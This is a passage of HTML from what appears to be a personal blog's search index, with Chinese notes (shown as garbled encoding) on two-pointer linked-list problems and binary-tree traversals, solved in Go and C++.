&lt;p&gt;æ€è·¯å°±æ˜¯å…ˆæ±‚å‡ºä¸¤ä¸ªé“¾è¡¨çš„é•¿åº¦ï¼Œæ±‚å‡ºä¸¤é“¾è¡¨çš„å·®å€¼ï¼Œç„¶åå…ˆè®©é•¿çš„é“¾è¡¨ç§»åŠ¨å·®å€¼æ­¥ï¼Œç„¶åäºŒè€…ä¸€å—ç§»åŠ¨çœ‹æŒ‡é’ˆæ˜¯å¦ç›¸åŒã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;/**
 * Definition for singly-linked list.
 * type ListNode struct {
 *     Val int
 *     Next *ListNode
 * }
 */
func getIntersectionNode(headA, headB *ListNode) *ListNode {
    
    i, j := 0, 0

    tmp := headA
    for tmp != nil {
        tmp = tmp.Next
        i ++
    }

    tmp = headB
    for tmp != nil {
        tmp = tmp.Next
        j ++
    }

    var tmp1, tmp2 *ListNode
    var k int

    if i &amp;gt; j {
        tmp1 = headA
        tmp2 = headB
        k = i - j
    } else {
        tmp1 = headB
        tmp2 = headA
        k = j - i
    }

    for k &amp;gt; 0 {
        k-- 
        tmp1 = tmp1.Next
    }

    for tmp1 != tmp2 {
        tmp1 = tmp1.Next
        tmp2 = tmp2.Next
    }

    return tmp1

}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;ç¯å½¢é“¾è¡¨ii&#34;&gt;ç¯å½¢é“¾è¡¨â…¡â€»&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/linked-list-cycle-ii/&lt;/p&gt;
&lt;p&gt;è®¾ç½®å¿«æ…¢æŒ‡é’ˆï¼Œå¿«æŒ‡é’ˆä¸€æ¬¡èµ°ä¸¤æ­¥ï¼Œæ…¢æŒ‡é’ˆä¸€æ¬¡èµ°ä¸€æ­¥ï¼ŒäºŒè€…ç›¸é‡æ—¶ä¸€å®šæ˜¯åœ¨ç¯å†…ï¼Œå‡è®¾å¤´èŠ‚ç‚¹åˆ°ç¯çš„å…¥å£è·ç¦»ä¸º&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;x&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.43056em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ï¼Œå…¥å£åˆ°å¿«æ…¢æŒ‡é’ˆç›¸é‡çš„ä½ç½®è·ç¦»ä¸º&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;y&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.625em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ï¼Œä»ç›¸é‡ä½ç½®åˆ°ç¯å…¥å£ä½ç½®è·ç¦»ä¸º&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;z&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;z&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.43056em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.04398em;&#34;&gt;z&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ï¼Œå¦‚å›¾æ‰€ç¤ºã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640684493645.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;ç›¸é‡æ—¶ï¼Œæ…¢æŒ‡é’ˆèµ°è¿‡çš„è·ç¦»ä¸ºï¼š&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;x+y&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.66666em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.625em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;å¿«æŒ‡é’ˆèµ°è¿‡çš„è·ç¦»ä¸º&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;z&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;x+y+n(z+y)&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.66666em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.7777700000000001em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.04398em;&#34;&gt;z&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;è€Œå¿«æŒ‡é’ˆèµ°è¿‡çš„èŠ‚ç‚¹æ˜¯æ…¢æŒ‡é’ˆçš„äºŒå€ï¼Œå³ï¼š&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;z&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;2(x+y)=x+y+n(z+y)&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.66666em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.7777700000000001em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.04398em;&#34;&gt;z&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;æœ€ç»ˆè¦æ±‚çš„æ˜¯&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;x&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.43056em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ï¼Œ&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;âˆ’&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;z&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;z&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;x=(n-1)(y+z)+z&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.43056em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ’&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.04398em;&#34;&gt;z&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.43056em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.04398em;&#34;&gt;z&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ã€‚&lt;/p&gt;
&lt;p&gt;å½“&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;n=1&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.43056em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.64444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;æ—¶ï¼Œ&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;z&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;x=z&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.43056em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.43056em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.04398em;&#34;&gt;z&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ï¼Œå³å½“ä¸¤æŒ‡é’ˆç›¸é‡æ—¶ï¼Œä»ç›¸é‡èŠ‚ç‚¹å’Œå¤´èŠ‚ç‚¹å„å‡ºå‘ä¸€ä¸ªæŒ‡é’ˆï¼Œå½“ä¸¤æŒ‡é’ˆç›¸é‡æ—¶è®°ä¸ºå¤´å£èŠ‚ç‚¹ã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640684507077.gif&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;/**
 * Definition for singly-linked list.
 * type ListNode struct {
 *     Val int
 *     Next *ListNode
 * }
 */
func detectCycle(head *ListNode) *ListNode {
    if head == nil {
        return nil
    }
    var fast, slow *ListNode
    fast, slow = head, head

    for true {
        if fast.Next != nil &amp;amp;&amp;amp; fast.Next.Next != nil {
            fast = fast.Next.Next
        } else {
            return nil
        }
        slow = slow.Next
        if fast == slow {
            index1, index2 := head, fast
            for index1 != index2 {
                index1 = index1.Next
                index2 = index2.Next
            }
            return index1
        }
    }
    return nil

}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;åˆ é™¤é“¾è¡¨çš„å€’æ•°ç¬¬nä¸ªèŠ‚ç‚¹&#34;&gt;åˆ é™¤é“¾è¡¨çš„å€’æ•°ç¬¬Nä¸ªèŠ‚ç‚¹â€»&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/remove-nth-node-from-end-of-list/&lt;/p&gt;
&lt;p&gt;åŒæŒ‡é’ˆé¦–å…ˆéƒ½æŒ‡å‘å¤´èŠ‚ç‚¹ï¼Œå¿«æŒ‡é’ˆå…ˆèµ°næ­¥ï¼Œç„¶åå¿«æ…¢æŒ‡é’ˆå†ä¸€èµ·èµ°ï¼Œç›´åˆ°å¿«æŒ‡é’ˆåˆ°ç»“å°¾ï¼Œé‚£ä¹ˆæ…¢æŒ‡é’ˆä¸‹ä¸€ä¸ªå…ƒç´ å³æ—¶è¦åˆ é™¤çš„å…ƒç´ ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;/**
 * Definition for singly-linked list.
 * type ListNode struct {
 *     Val int
 *     Next *ListNode
 * }
 */
func removeNthFromEnd(head *ListNode, n int) *ListNode {
    nilhead := &amp;amp;ListNode{
        0,
        head,
    }

    fast, slow := nilhead, nilhead
    for i := 0; i &amp;lt;= n; i++ {
        fast = fast.Next
    }

    for fast != nil {
        fast = fast.Next
        slow = slow.Next
    }

    slow.Next = slow.Next.Next

    return nilhead.Next
}
&lt;/code&gt;&lt;/pre&gt;
">ã€ç®—æ³•ã€‘åŒæŒ‡é’ˆ</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/suan-fa-shu/"" data-c="
          &lt;h3 id=&#34;äºŒå‰æ ‘çš„å‰ä¸­ååºéå†&#34;&gt;äºŒå‰æ ‘çš„å‰ä¸­ååºéå†&lt;/h3&gt;
&lt;h4 id=&#34;å‰åºéå†&#34;&gt;å‰åºéå†&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;å‰åºéå†çš„è®¿é—®å’Œå¤„ç†é¡ºåºæ˜¯ä¸€è‡´çš„&lt;/strong&gt;ï¼Œå³å…ˆè®¿é—®å½“å‰èŠ‚ç‚¹ï¼Œå†å°†è¯¥èŠ‚ç‚¹çš„å·¦å­æ ‘å’Œå³å­æ ‘åŠ å…¥æ ˆä¸­ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;int&amp;gt; preorderTraversal(TreeNode* root) {
        stack&amp;lt;TreeNode*&amp;gt; st;
        vector&amp;lt;int&amp;gt; result;
        if (root == NULL) return result;
        st.push(root);
        while (!st.empty()) {
            TreeNode* node = st.top();                       // ä¸­
            st.pop();
            result.push_back(node-&amp;gt;val);
            if (node-&amp;gt;right) st.push(node-&amp;gt;right);
            if (node-&amp;gt;left) st.push(node-&amp;gt;left);
            // å…ˆæ”¾å³èŠ‚ç‚¹åæ”¾å·¦èŠ‚ç‚¹ï¼Œåè¿›å…ˆå‡ºï¼Œæ‰€ä»¥å‡ºæ ˆå°±æ˜¯å…ˆå·¦åå³
        }
        return result;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;ä¸­åºéå†&#34;&gt;ä¸­åºéå†&lt;/h4&gt;
&lt;p&gt;ä¸­åºéå†çš„è®¿é—®é¡ºåºå’Œå¤„ç†é¡ºåºæ˜¯ä¸ä¸€è‡´çš„ï¼Œå³å…ˆè®¿é—®è¯¥èŠ‚ç‚¹çš„å·¦å­æ ‘ï¼Œè¿”å›æ¥å†è®¿é—®è¯¥èŠ‚ç‚¹ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;int&amp;gt; inorderTraversal(TreeNode* root) {
        vector&amp;lt;int&amp;gt; result;
        stack&amp;lt;TreeNode*&amp;gt; st;
        TreeNode* cur = root;
        while (cur != NULL || !st.empty()) {
            if (cur != NULL) {
                st.push(cur);
                cur = cur-&amp;gt;left;
            }
            else {
                cur = st.top();
                st.pop();
                result.push_back(cur-&amp;gt;val);
                cur = cur-&amp;gt;right;
            }
        }
        return result;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;ååºéå†&#34;&gt;ååºéå†&lt;/h4&gt;
&lt;p&gt;ååºéå†æ˜¯å·¦å³ä¸­ï¼Œåªéœ€è¦å°†å‰åºéå†çš„é¡ºåºå˜æ¢ä¸€ä¸‹å°±å¥½äº†ï¼Œå‰åºéå†æ˜¯å…ˆè®¿é—®ä¸­ï¼Œç„¶åå°†å³å­æ ‘å…¥æ ˆã€å·¦å­æ ‘å…¥æ ˆï¼Œæœ€åçš„éå†çš„é¡ºåºå°±æ˜¯ä¸­å·¦å³ã€‚&lt;/p&gt;
&lt;p&gt;è€Œç°åœ¨å¯ä»¥å…ˆè®¿é—®ä¸­ï¼Œç„¶åå°†å·¦å­æ ‘å…¥æ ˆã€å³å­æ ‘å…¥æ ˆï¼Œé‚£ä¹ˆè®¿é—®é¡ºåºå°±æ˜¯ä¸­å³å·¦ï¼Œæœ€åè®¿é—®å®Œåï¼Œå°†è®¿é—®åºåˆ—é€†åºè¿‡æ¥å°±æ˜¯å·¦å³ä¸­äº†ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;int&amp;gt; postorderTraversal(TreeNode* root) {
        stack&amp;lt;TreeNode*&amp;gt; st;
        vector&amp;lt;int&amp;gt; result;
        if (root == NULL) return result;
        st.push(root);
        while (!st.empty()) {
            TreeNode* node = st.top();
            st.pop();
            result.push_back(node-&amp;gt;val);
            if (node-&amp;gt;left) st.push(node-&amp;gt;left); // ç›¸å¯¹äºå‰åºéå†ï¼Œè¿™æ›´æ”¹ä¸€ä¸‹å…¥æ ˆé¡ºåº ï¼ˆç©ºèŠ‚ç‚¹ä¸å…¥æ ˆï¼‰
            if (node-&amp;gt;right) st.push(node-&amp;gt;right); // ç©ºèŠ‚ç‚¹ä¸å…¥æ ˆ
        }
